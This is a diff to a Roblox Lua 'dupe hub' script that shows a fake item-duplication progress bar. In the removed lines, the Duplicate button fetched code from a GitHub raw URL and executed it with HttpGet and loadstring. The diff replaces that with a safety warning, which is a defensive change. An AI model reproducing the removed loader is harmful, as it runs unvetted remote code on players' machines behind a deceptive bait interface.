@@ -5,6 +5,10 @@ local TweenService = game:GetService("TweenService")
 local LP = Players.LocalPlayer
 local PG = LP:WaitForChild("PlayerGui")
 
+-- Thời gian cấu hình (giây)
+local LOADING_TIME = 30     -- thời gian loading ban đầu (30 giây)
+local DUPLICATE_TIME = 20   -- thời gian thanh tiến trình khi nhấn Duplicate (20 giây)
+
 local GUI_NAME = "Dupe_Hub_Roblox"
 local old = PG:FindFirstChild(GUI_NAME)
 if old then old:Destroy() end
@@ -63,7 +67,7 @@ gui.IgnoreGuiInset = true
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 gui.Parent = PG
 
--- Loading box (8s)
+-- Loading box (LOADING_TIME)
 local bg = Instance.new("Frame", gui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -109,7 +113,8 @@ fill.BackgroundColor3 = Color3.fromRGB(160, 90, 255)
 fill.BorderSizePixel = 0
 Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 12)
 
-TweenService:Create(fill, TweenInfo.new(20, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+-- Sử dụng LOADING_TIME ở đây
+TweenService:Create(fill, TweenInfo.new(LOADING_TIME, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
 
 -- Main Hub
 local frame = Instance.new("Frame", gui)
@@ -149,8 +154,8 @@ local btnDup2 = pill(body, "🧠 Duplicate")
 btnDup2.Position = UDim2.new(0, 0, 0, 0)
 pillColor(btnDup2, 114, 106, 240)
 
--- Tiến trình 10s + đổi màu sau khi xong
-local function ShowProgress20sSync(callback)
+-- Thay hàm ShowProgress10sSync bằng hàm dùng DUPLICATE_TIME
+local function ShowProgressTimed(callback)
 	if gui:FindFirstChild("KS_ProgressModal") then gui.KS_ProgressModal:Destroy() end
 	local modal = Instance.new("Frame", gui)
 	modal.Name = "KS_ProgressModal"
@@ -196,11 +201,15 @@ local function ShowProgress20sSync(callback)
 	pf.BorderSizePixel = 0
 	Instance.new("UICorner", pf).CornerRadius = UDim.new(0, 12)
 
+	-- Tính thời gian chờ theo số phần trăm
+	local totalSteps = 100
+	local stepDelay = DUPLICATE_TIME / totalSteps
+
 	task.spawn(function()
-		for i = 1, 100 do
+		for i = 1, totalSteps do
 			percent.Text = i .. "%"
-			pf.Size = UDim2.new(i / 100, 0, 1, 0)
-			task.wait(0.1)
+			pf.Size = UDim2.new(i / totalSteps, 0, 1, 0)
+			task.wait(stepDelay)
 		end
 		mt.Text = "Success"
 		task.wait(0.8)
@@ -214,12 +223,32 @@ btnDup2.MouseButton1Click:Connect(function()
 	pcall(function()
 		btnDup2.Text = "🧠 Duplicate"
 		pillColor(btnDup2, 114, 106, 240) -- Giữ màu tím
-		ShowProgress20sSync(function()
+		ShowProgressTimed(function()
+			-- Đã **GHI ĐÈ** hành vi tải mã từ internet vì lý do an toàn.
+			-- Thay vì tải và thực thi mã từ URL ngoài, ta hiển thị cảnh báo/log.
 			pillColor(btnDup2, 70, 200, 90) -- Đổi xanh khi xong
-			local u = "https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"
-			local s
-			pcall(function() s = game:HttpGet(u) end)
-			if s and s ~= "" then pcall(loadstring(s)) else warn("⚠️ Load Failed:", u) end
+
+			-- An toàn: không thực hiện game:HttpGet/loadstring.
+			-- Nếu bạn cần chạy hành vi an toàn tại đây, thay bằng hàm nội bộ rõ ràng.
+			warn("External script execution is blocked for safety. No HttpGet/loadstring was performed.")
+			
+			-- Tuỳ chọn: hiển thị modal thông báo thay vì load string
+			local notice = Instance.new("Frame", gui)
+			notice.AnchorPoint = Vector2.new(0.5, 0.5)
+			notice.Position = UDim2.new(0.5, 0.5, 0, 0)
+			notice.Size = UDim2.new(0, 320, 0, 120)
+			notice.BackgroundColor3 = Color3.fromRGB(20,20,20)
+			Instance.new("UICorner", notice).CornerRadius = UDim.new(0,12)
+			local lbl = Instance.new("TextLabel", notice)
+			lbl.Size = UDim2.new(1, -24, 1, -24)
+			lbl.Position = UDim2.new(0, 12, 0, 12)
+			lbl.BackgroundTransparency = 1
+			lbl.TextColor3 = Color3.fromRGB(220,220,220)
+			lbl.Font = Enum.Font.Gotham
+			lbl.TextSize = 16
+			lbl.TextWrapped = true
+			lbl.Text = "External script execution was blocked for your safety. No remote code was executed."
+			delay(2.5, function() notice:Destroy() end)
 		end)
 	end)
 end)
@@ -244,8 +273,8 @@ panel.MouseButton1Click:Connect(function()
 	frame.Visible = visible
 end)
 
--- Delay hiển thị
-task.delay(8, function()
+-- Delay hiển thị dùng LOADING_TIME
+task.delay(LOADING_TIME, function()
 	bg:Destroy()
 	box:Destroy()
 	frame.Visible = true
